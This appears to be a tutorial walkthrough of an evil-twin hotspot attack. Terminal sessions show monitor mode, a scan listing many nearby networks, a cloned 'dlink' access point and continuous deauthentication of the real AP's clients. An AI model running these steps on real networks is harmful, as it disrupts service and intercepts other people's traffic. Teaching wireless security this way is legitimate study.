#### Part	9: Hotspot Attacks

Before connecting the Alfa card

```sh
root@kali:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 51830  bytes 3435415 (3.2 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 47066  bytes 33321752 (31.7 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 248  bytes 12512 (12.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 248  bytes 12512 (12.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~#
```	
	
Connect the Alfa card

```sh
root@kali:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 113  bytes 13062 (12.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 116  bytes 19058 (18.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 20  bytes 1116 (1.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1116 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~# ifconfig -a
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 124  bytes 13940 (13.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 123  bytes 20732 (20.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 20  bytes 1116 (1.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1116 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4098<BROADCAST,MULTICAST>  mtu 1500
        ether 00:c0:ca:92:3c:89  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~# ifconfig wlan0 up
root@kali:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 377  bytes 30254 (29.5 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 169  bytes 26425 (25.8 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 20  bytes 1116 (1.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1116 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether ae:ac:75:a7:71:b2  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~#
```

Put the card in monitor mode

```sh
root@kali:~# airmon-ng

PHY	Interface	Driver		Chipset

phy1	wlan0		rtl8187		Realtek Semiconductor Corp. RTL8187

root@kali:~# airmon-ng start wlan0

Found 3 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to run 'airmon-ng check kill'

  PID Name
  400 NetworkManager
  569 dhclient
  804 wpa_supplicant

PHY	Interface	Driver		Chipset

phy1	wlan0		rtl8187		Realtek Semiconductor Corp. RTL8187

		(mac80211 monitor mode vif enabled for [phy1]wlan0 on [phy1]wlan0mon)
		(mac80211 station mode vif disabled for [phy1]wlan0)

root@kali:~# airmon-ng

PHY	Interface	Driver		Chipset

phy1	wlan0mon	rtl8187		Realtek Semiconductor Corp. RTL8187

root@kali:~#
```

Check for the monitor mode interface

```sh
root@kali:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 518  bytes 40324 (39.3 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 236  bytes 35799 (34.9 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 20  bytes 1116 (1.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1116 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0mon: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        unspec 00-C0-CA-92-3C-89-30-30-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
        RX packets 858  bytes 151521 (147.9 KiB)
        RX errors 0  dropped 858  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~# iwconfig
lo        no wireless extensions.

eth0      no wireless extensions.

wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on

root@kali:~#
```

Identify channel of AP

```sh
root@kali:~# airodump-ng wlan0mon

 CH  3 ][ Elapsed: 0 s ][ 2017-06-05 19:38

 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 A0:63:91:4B:42:82  -37        3        0    0   3  54e  WPA2 CCMP   PSK  NETGEAR91
 78:F2:9E:D2:F3:38  -57        2        0    0   6  54e. WPA2 CCMP   PSK  HOME-27B0-2.4
 78:F2:9E:D2:F3:3B  -34        2        0    0   6  54e. OPN              <length:  0>
 78:F2:9E:D2:F3:3D  -33        2        0    0   6  54e. WPA2 CCMP   MGT  <length:  0>
 78:F2:9E:D2:F3:3A  -38        4        0    0   6  54e. OPN              xfinitywifi
 BC:EE:7B:DE:56:31  -63        2        0    0   2  54e  WPA2 CCMP   PSK  ASUS_Guest
 BC:EE:7B:DE:56:30  -65        2        1    0   2  54e  WPA2 CCMP   PSK  <length: 10>
 56:1F:E4:E5:52:91  -47        4        0    0  11  54e. WPA2 CCMP   PSK  <length:  0>
 36:1F:E4:E5:52:91  -38        2        0    0  11  54e. WPA2 CCMP   PSK  <length:  0>
 76:1F:E4:E5:52:91  -39        4        0    0  11  54e. WPA2 CCMP   MGT  <length:  0>
 50:6A:03:AE:3A:FB  -61        2        0    0   7  54e  WPA2 CCMP   PSK  NETGEAR36
 FA:8F:CA:83:24:94  -48        4        0    0   7  54e. OPN              <length:  0>
 78:F2:9E:D2:F3:39  -31        3        0    0   6  54e. WPA2 CCMP   PSK  <length:  0>
 DC:EF:09:97:4B:06  -67        2        0    0   7  54e  WPA2 CCMP   PSK  NETGEAR10
 84:C9:B2:6D:0C:85  -31        6        0    0   4  11e. OPN              dlink
 04:4E:5A:FB:44:46  -56        2        0    0   1  54e. WPA2 CCMP   PSK  Spinner
 9E:34:26:8A:34:A2  -30        2        0    0   1  54e. WPA2 CCMP   PSK  <length:  0>
 C2:56:27:6A:BA:A4  -65        2        0    0   1  54e. OPN              Muthu_Guest
 16:4E:5A:FB:44:46  -57        2        0    0   1  54e. OPN              xfinitywifi
 9C:34:26:8A:34:A2  -30        3        0    0   1  54e. WPA2 CCMP   PSK  eeshawifi
 E6:3E:FC:97:32:00  -71        2        0    0   1  54e  OPN              xfinitywifi
 C6:3F:B4:87:66:10  -60        3        0    0   1  54e  OPN              xfinitywifi
 C2:3F:B4:87:66:10  -60        4        0    0   1  54e  WPA2 CCMP   PSK  <length:  0>
 C8:3F:B4:87:66:10  -64        4        0    0   1  54e  WPA2 CCMP   PSK  HOME-6612
 B0:7F:B9:2A:4F:BB  -60        3        0    0  11  54e  WPA2 CCMP   PSK  kukikikukiki
 C4:04:15:3A:8B:30  -38        3        0    0  11  54e  WPA2 CCMP   PSK  NETGEAR43
 46:1F:E4:E5:52:91  -43        4        0    0  11  54e. OPN              xfinitywifi
 34:1F:E4:E5:52:91  -41        3        0    0  11  54e. WPA2 CCMP   PSK  Lowspeed

 BSSID              STATION            PWR   Rate    Lost    Frames  Probe


root@kali:~#
```
The ```dlink``` AP is on channel 4
<br/>
Put the card on channel 4

```sh
root@kali:~# iwconfig
lo        no wireless extensions.

eth0      no wireless extensions.

wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.484 GHz  Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on

root@kali:~# iwconfig wlan0mon channel 4
root@kali:~# iwconfig
lo        no wireless extensions.

eth0      no wireless extensions.

wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.427 GHz  Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on

root@kali:~#
```

Create a soft AP

```sh
root@kali:~# airbase-ng -a AA:AA:AA:AA:AA:AA -e dlink wlan0mon
19:49:04  Created tap interface at0
19:49:04  Trying to set MTU on at0 to 1500
19:49:04  Access Point with BSSID AA:AA:AA:AA:AA:AA started.
```

```sh
root@kali:~# ifconfig -a
at0: flags=4098<BROADCAST,MULTICAST>  mtu 1500
        ether aa:aa:aa:aa:aa:aa  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        inet6 2601:644:8501:6c87::1e31  prefixlen 128  scopeid 0x0<global>
        inet6 2601:644:8501:6c87:a00:27ff:feec:26e5  prefixlen 64  scopeid 0x0<global>
        inet6 2601:644:8501:6c87:bc6d:230b:ce5f:a0e1  prefixlen 64  scopeid 0x0<global>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 2856  bytes 217162 (212.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1642  bytes 365207 (356.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 26  bytes 1656 (1.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 26  bytes 1656 (1.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0mon: flags=867<UP,BROADCAST,NOTRAILERS,RUNNING,PROMISC,ALLMULTI>  mtu 1800
        unspec 00-C0-CA-92-3C-89-30-30-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
        RX packets 67295  bytes 14393182 (13.7 MiB)
        RX errors 0  dropped 47598  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~# ifconfig at0 up
root@kali:~#
```

Deauth the client which makes sure it doesn't connect to the legitimate AP

```sh
root@kali:~# aireplay-ng --deauth 0 wlan0mon -a 84:C9:B2:6D:0C:85
19:49:52  Waiting for beacon frame (BSSID: 84:C9:B2:6D:0C:85) on channel 4
NB: this attack is more effective when targeting
a connected wireless client (-c <client's mac>).
19:49:52  Sending DeAuth to broadcast -- BSSID: [84:C9:B2:6D:0C:85]
19:49:53  Sending DeAuth to broadcast -- BSSID: [84:C9:B2:6D:0C:85]
19:49:53  Sending DeAuth to broadcast -- BSSID: [84:C9:B2:6D:0C:85]
19:49:54  Sending DeAuth to broadcast -- BSSID: [84:C9:B2:6D:0C:85]
19:49:54  Sending DeAuth to broadcast -- BSSID: [84:C9:B2:6D:0C:85]
19:49:55  Sending DeAuth to broadcast -- BSSID: [84:C9:B2:6D:0C:85]
19:49:55  Sending DeAuth to broadcast -- BSSID: [84:C9:B2:6D:0C:85]
19:49:56  Sending DeAuth to broadcast -- BSSID: [84:C9:B2:6D:0C:85]
19:49:56  Sending DeAuth to broadcast -- BSSID: [84:C9:B2:6D:0C:85]
19:49:57  Sending DeAuth to broadcast -- BSSID: [84:C9:B2:6D:0C:85]
19:49:57  Sending DeAuth to broadcast -- BSSID: [84:C9:B2:6D:0C:85]
19:49:58  Sending DeAuth to broadcast -- BSSID: [84:C9:B2:6D:0C:85]
19:49:58  Sending DeAuth to broadcast -- BSSID: [84:C9:B2:6D:0C:85]
19:49:59  Sending DeAuth to broadcast -- BSSID: [84:C9:B2:6D:0C:85]
```

The client connect to the attackers soft AP

```sh
root@kali:~# airbase-ng -a AA:AA:AA:AA:AA:AA -e dlink wlan0mon
19:49:04  Created tap interface at0
19:49:04  Trying to set MTU on at0 to 1500
19:49:04  Access Point with BSSID AA:AA:AA:AA:AA:AA started.
19:49:54  Client BC:9F:EF:69:35:19 associated (unencrypted) to ESSID: "dlink"
19:49:54  Client BC:9F:EF:69:35:19 associated (unencrypted) to ESSID: "dlink"
19:49:54  Client BC:9F:EF:69:35:19 associated (unencrypted) to ESSID: "dlink"
19:49:54  Client BC:9F:EF:69:35:19 associated (unencrypted) to ESSID: "dlink"
19:49:54  Client BC:9F:EF:69:35:19 associated (unencrypted) to ESSID: "dlink"
```